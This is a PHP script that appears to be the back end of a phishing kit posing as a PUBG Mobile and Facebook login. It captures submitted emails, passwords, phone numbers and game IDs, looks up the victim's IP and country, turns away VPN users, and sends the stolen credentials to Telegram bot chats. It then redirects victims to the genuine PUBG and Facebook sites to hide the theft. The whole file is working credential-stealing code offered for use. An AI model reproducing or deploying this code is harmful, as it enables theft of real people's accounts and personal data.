<?php
error_reporting(1);
session_start();
if(isset($_SESSION["last_access"])){
if(@$_SESSION["last_access"] > (time() - 5)){
header('Location: https://www.facebook.com');
exit('Error 505');
}
}
@$getttYhyaSyrian = explode("\n",file_get_contents('hiolbah.txt'));
if(in_array(@$_POST['email'],@$getttYhyaSyrian)){
header('Location: https://www.facebook.com');
exit('Error 504');
}else{
file_put_contents('hiolbah.txt',@$_POST['email']."\n",FILE_APPEND);
}
$email = $_POST['email'];
$password = $_POST['password'];
$username = $_POST["username"];
$nick = $_POST['nick'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$time = date("Y-m-d H:i:s");
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$cty = $_POST['cty'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$pk = $_SERVER['HTTP_HOST'];
 $uls= $_SERVER['REQUEST_URI'];
$platform = $_POST['platform'];
$login = $_POST['login'];
$platform = $_POST['platform'];
$cty1 = $_POST['cty1'];
$chresult = $_POST['chresult'];
$ch = $_POST['ch'];
date_default_timezone_set('Africa/Cairo');
$date = date("Y/m/d h:i:s");
include "home.php"; 

function getUserIP(){
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
          $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
          $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];

if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $ip = $forward;
}else{
    $ip = $remote;
}
return $ip;
}
 $ip = getUserIP();

$api = json_decode(file_get_contents("https://api.dlyar-dev.tk/whois?ip=".$ip),1);
$flag = $apiGL['emojiFlag'];

$flag = $api["flag"];
$ccode = $api["code"];
$country = $api["country-ar"];
$cvpn = $api["check-vpn"];
if($cvpn == true){
exit("Why you Enable vpn?");
}

$link = "https://www.facebook.com";


$countrycode = $apiGL['country_code'];

$token = "my-token";
$id = "my-id";
$msg = "
 Seaf sindhi  » [VIP](tg://user?id=$id)
━━━━━━━━━━━━━━━━━━━
♻️𝐋𝐎𝐆𝐈𝐍 » SpiN
♻️𝐋𝐎𝐆𝐈𝐍 » $login
━━━━━━━━━━━━━━━━━━━
🔴𝐄𝐌𝐀𝐈𝐋 » `$email`
🔐𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 » `$password`
🌐𝐂𝐎𝐔𝐍𝐓𝐑𝐘 𝐍𝐀𝐌𝐄 » $country $flag
🔷𝐂𝐎𝐃𝐄 » `$ccode`
⌨️ 𝐓𝐈𝐌𝐄 » $time
━━━━━━━━━━━━━━━━━━━
ᯓ ʙʏ » 👨🏼‍💻 ↬ ‹ [Seaf sindhi](t.me/s0_32) 
";
$mesg = ['chat_id'=>$id,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?".$message);
header('Location: https://www.pubgmobile.com/ar/event/royalepass5/m/');

$token2 = "<TOKEN_REMOVED>";

$id2 = 1796238170; 

$mesg = ['chat_id'=>$id2,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token2/sendMessage?".$message);
header("Location: ".$link);